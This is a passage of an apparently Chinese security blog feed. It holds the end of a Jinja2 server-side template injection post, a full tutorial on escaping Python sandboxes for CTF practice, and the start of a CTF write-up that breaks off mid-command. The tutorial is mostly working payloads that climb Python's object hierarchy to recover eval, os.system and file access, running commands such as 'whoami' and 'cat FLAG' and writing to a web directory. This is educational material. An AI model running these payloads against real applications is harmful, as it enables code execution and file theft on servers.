class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/07/ktNZbn.png" alt="ktNZbn.png"></p><p>成功读取根目录下的文件</p><p><img src="https://s2.ax1x.com/2019/02/07/ktNMCT.png" alt="ktNMCT.png"></p><p>另外再拿</p><p>这东西只要找对继承关系，而且继承关系里面的方法清楚的话就很快获得效果，当然防范的话得从代码层下手，永远不要相信用户的输入就对了，对可控变量做好防御XD</p><p>参考文章:</p><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p><p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p><p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;先入个门&quot;&gt;&lt;a href=&quot;#先入个门&quot; class=&quot;headerlink&quot; title=&quot;先入个门&quot;&gt;&lt;/a&gt;先入个门&lt;/h3&gt;&lt;h4 id=&quot;Jimja2&quot;&gt;&lt;a href=&quot;#Jimja2&quot; class=&quot;headerlink&quot; title=&quot;Jimja2&quot;&gt;&lt;/a&gt;Jimja2&lt;/h4&gt;&lt;p&gt;&lt;code&gt;Jinja2&lt;/code&gt;是默认的仿&lt;code&gt;Django&lt;/code&gt;模板的一个模板引擎，由&lt;code&gt;Flask&lt;/code&gt;的作者开发。网上搜的语法
    
    </summary>
    
      <category term="SSTI注入" scheme="0verwatch.top/categories/SSTI%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SSTI注入" scheme="0verwatch.top/tags/SSTI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python沙盒绕过</title>
    <link href="0verwatch.top/python-sandbox-bypass.html"/>
    <id>0verwatch.top/python-sandbox-bypass.html</id>
    <published>2019-02-04T08:28:00.000Z</published>
    <updated>2019-02-08T10:20:31.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>一些函数需要了解一下，这篇文章讲的已经很详细<a id="more"></a>了:<a href="https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数</a></p><ul><li><code>__class__</code> :返回一个实例所属的类</li><li><code>__bases__</code> :返回一个类<code>直接</code>所继承的类（元组形式）</li><li><code>__mro__</code> :列出解析方法的调用顺序，类似于bases</li><li><code>__subclasses__()</code>：返回子类列表</li><li><code>__dict__</code> ： 列出当前属性/函数的字典</li><li><code>func_globals</code>：返回一个包含函数全局变量的字典引用</li><li><code>__globals__</code>:返回一个当前空间下能使用的模块，方法和变量的字典</li></ul><p>上面的模块中可以尝试理解mro和bases之间的区别，两个的东西还是有点区别的，只是作用在绕过上功能类似。个人感觉mro的发展过程有点像从dfs编程bfs。。。</p><h3 id="dir方法"><a href="#dir方法" class="headerlink" title="dir方法"></a>dir方法</h3><ul><li>dir()在没有参数的时候返回本地作用域中的名称列表</li><li>dir()在有参数的时候返回该对象的有效属性列表</li></ul><p>对比一下下面的例子就知道了，以py2为例：</p><p><img src="https://s2.ax1x.com/2019/02/07/ktIJLd.png" alt="ktIJLd.png"></p><h3 id="内联模块"><a href="#内联模块" class="headerlink" title="内联模块"></a>内联模块</h3><p>python中可以直接运行一些函数，例如<code>int(),list()</code>等等。这些函数可以在内联模块中可以查到。</p><p>常用的有下面两个：<code>__import__</code>以及<code>__builtins__</code>，但是在py2里面内置模块名字叫<code>__builtin__</code>，py3改名叫<code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">In [<span class="number">4</span>]: __builtin__</span><br><span class="line">Out[<span class="number">4</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: __builtins__</span><br><span class="line">Out[<span class="number">5</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="comment">#python 3.6</span></span><br><span class="line">In [<span class="number">2</span>]: __builtin__                                                                                             </span><br><span class="line">Out[<span class="number">2</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: __builtins__                                                                                    </span><br><span class="line">Out[<span class="number">3</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>在py2中，在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p><p>非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>如果导入的模块a中有着另一个模块b，那么，我们可以用<code>a.b</code>的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p><h3 id="弄一个沙盒环境"><a href="#弄一个沙盒环境" class="headerlink" title="弄一个沙盒环境"></a>弄一个沙盒环境</h3><p>一般读取目录的时候需要使用到<code>os.system</code>函数，这样的一句话这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure><p>然后我们可以把一些关键模块给删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># 管理员删了很多的危险函数</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'...'</span>]</span><br></pre></td></tr></table></figure><p>这时候import已经失效了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>但是可以用 reload来重新导入模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure><p>但是请注意，在<strong>Python 3.0把reload内置函数移到了import库模块中。</strong>所以python3中，这个方法已经失效了</p><p>所以在制作py2.7沙箱的时候，还需要删除<code>reload</code>的方法。</p><h3 id="一道题目"><a href="#一道题目" class="headerlink" title="一道题目"></a>一道题目</h3><p>这个题目很常见了，py2的环境，自己拿来练下手,最后是读取当前文件夹下的key文件，删除了很多关键函数，也包括了<code>reload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'compile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'S+'</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><h4 id="用file类去读取文件"><a href="#用file类去读取文件" class="headerlink" title="用file类去读取文件"></a>用file类去读取文件</h4><p>面对这个时候我们已经不能使用<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>去读取文件但我们可以利用object类去寻找file类去读取文件内容</p><p>思路是这样的：</p><ol><li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li><li>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</li><li>用<code>__subclasses__()</code>拿到子类列表</li><li>在子类列表中直接寻找可以利用的类</li></ol><p>也就是</p><p><code>().__class__.__bases__[0].__subclasses__()[40]</code></p><p>但是面对<code>__subclasses__</code>的子类太多找不到对应的file类怎么办？可以这样去寻找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span>   <span class="comment">#这里填写你要寻找的类即可</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后可以用dir函数查看里面的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure><p>所以最后的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br><span class="line"><span class="comment">#同样的效果</span></span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>注意py3已经移除了file了这种方法也只能在py3里面使用</p><h4 id="利用内置函数执行命令"><a href="#利用内置函数执行命令" class="headerlink" title="利用内置函数执行命令"></a>利用内置函数执行命令</h4><p>可以根据第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），查找<code>os</code>模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 71)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 76)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>然后构造继承链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>但是这个方法也只能在py2里面实现，同样在前面的SSTI注入中vulhub给的测试payload用的是<code>class &#39;warnings.catch_warnings&#39;</code>这一个类，同样这个类里面也有os模块，可以像下面这个样子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:返回一个包含函数全局变量的字典引用；</span></span><br></pre></td></tr></table></figure><p>上面的方法大都有限制，py2跟py3可以使用<code>__builtins__</code>通吃</p><p>py3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>py2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>因为<code>__builtins__</code>返回的是一个字典。通过has_key的方法，可以发现我们想要的是否存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__.has_key(<span class="string">'reload'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>所以在出题的时候我们可以把该模块下的函数删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br></pre></td></tr></table></figure><h2 id="python-代码执行函数与新特性以及f修饰符"><a href="#python-代码执行函数与新特性以及f修饰符" class="headerlink" title="python 代码执行函数与新特性以及f修饰符"></a>python 代码执行函数与新特性以及f修饰符</h2><p>下面内容摘取自<code>https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</code>以及<code>http://shaobaobaoer.cn/archives/656/python-sandbox-escape</code></p><p>在python中常见的代码执行函数如下所示</p><p>（1）timeit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>（2）exec 和eval 比较经典了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br></pre></td></tr></table></figure><p>（3）platform</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure><p>  (4) getattr() 和 getattribute()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>​    (5)f修饰符</p><p>用f修饰的字符串将可以执行代码, 但只有python版本在 3.6.0朝上才有这个方法</p><p><img src="https://s2.ax1x.com/2019/02/08/kNEfSK.png" alt="kNEfSK.png"></p><p>这种代码执行方法和PHP中的<code>&lt;?php &quot;${@phpinfo()}&quot;; ?&gt;</code>很类似，这是Python中很少有的几个能够直接将字符串转变成的代码的方式</p><p>执行代码总结</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上述命令需要通过哦 exec 或者别的命令执行函数执行</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; 对应 <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class">推荐的另外一个类</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure><p>就先总结到这里吧，感觉这个东西联系起SSTI还是可以起很大的作用的。</p><p>参考：</p><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12</a></p><p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p><p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h3&gt;&lt;p&gt;一些函数需要了解一下，这篇文章讲的已经很详细
    
    </summary>
    
      <category term="沙盒绕过" scheme="0verwatch.top/categories/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
    
      <category term="沙盒绕过" scheme="0verwatch.top/tags/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>安恒一月赛做题记录</title>
    <link href="0verwatch.top/anheng-1mongth.html"/>
    <id>0verwatch.top/anheng-1mongth.html</id>
    <published>2019-02-03T09:05:51.000Z</published>
    <updated>2019-02-08T10:15:25.705Z</updated>
    
    <content type="html"><![CDATA[<p>这个月的安恒月赛好像很有意思<a id="more"></a>，自己忘了去参加了2333，回过头做一做记录一下</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h4><p>百度可以知道历史上有两种键盘，QWERTY键盘还是Dvorak键盘？</p><p>其实就是他们两个的键盘对应的位置不一样导致的映射关系，可以用在线网站解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wbic16.xedoloh.com/dvorak.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYiUgJ.png" alt="kYiUgJ.png"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h4><p>都是些常规操作，binwalk–&gt;foremost–&gt;stegsolve，说真的现在都不想玩隐写</p><p><img src="https://s2.ax1x.com/2019/02/05/kYihDI.png" alt="kYihDI.png"></p><h4 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h4><p>这个隐写题目就有点意思啦，我以前没碰到过这种内存取证的，可以参考下面的文章<code>https://www.freebuf.com/column/152545.html</code>，这篇文章介绍了很多关于内存取证这款软件的操作，大致的volatility 使用可以概括如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f &lt;文件名&gt; 